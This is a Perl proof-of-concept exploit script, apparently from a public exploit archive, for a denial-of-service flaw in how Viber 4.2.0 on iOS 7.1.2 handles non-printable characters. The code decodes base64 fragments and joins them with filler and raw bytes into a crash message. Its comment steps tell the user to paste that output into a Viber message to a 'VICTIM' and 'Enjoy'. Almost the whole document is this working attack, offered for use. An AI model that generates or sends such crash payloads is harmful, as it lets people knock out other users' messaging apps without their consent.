#!/usr/bin/perl -w
#-*- coding: utf-8 -*
#
#[+] Title:  Viber Non-Printable Characters Handling Denial of Service Vulnerability
#[+] Product: Viber
#[+] Vendor: http://www.viber.com/en/
#[+] SoftWare Link : https://itunes.apple.com/app/viber-free-phone-calls/id382617920?mt=8
#[+] Vulnerable Version(s): Viber 4.2.0 on IOS 7.1.2
#
#
# Author      :   Mohammad Reza Espargham
# Linkedin    :   https://ir.linkedin.com/in/rezasp
# E-Mail      :   me[at]reza[dot]es , reza.espargham[at]gmail[dot]com
# Website     :   www.reza.es
# Twitter     :   https://twitter.com/rezesp
# FaceBook    :   https://www.facebook.com/mohammadreza.espargham


#Source :  https://www.securityfocus.com/bid/75217/info


# 1.run perl code
# 2.Copy the perl output text
# 3.Open Viber Desktop
# 4.Select Your VICTIM
# 5.Paste and Message
# 6.Enjoy


use open ':std', ':encoding(UTF-8)';
system(($^O eq 'MSWin32') ? 'cls' : 'clear');
use MIME::Base64;

$ut="M7tktuYbL14T";
$utd = decode_base64($ut);

$lt="sNiw2KAg2KAg2Ao=";
$ltd = decode_base64($lt);

$bt="M7tktuYbL14T";
$btd = decode_base64($bt);


$junk="Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9".
"Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9".
"Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9".
"Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9".
"Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9".
"Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9".
"Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9".
"Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9".
"Aq0Aq1Aq2Aq3Aq4Aq5Aq";
$tt="\xf5\xaa\xf1\x05\xa8\x26\x99\x3d\x3b\xc0\xd9\xfe\x51\x61" .
"\xb6\x0e\x2f\x85\x19\x87\xb7\x78\x2f\x59\x90\x7b\xd7\x05";

$buffer = "A"x153; # 100xA
$buffer1 = "A"x63; #5xA
print "\n\n$utd$buffer$ltd$tt$buffer1$junk$btd\n\n";
#END <3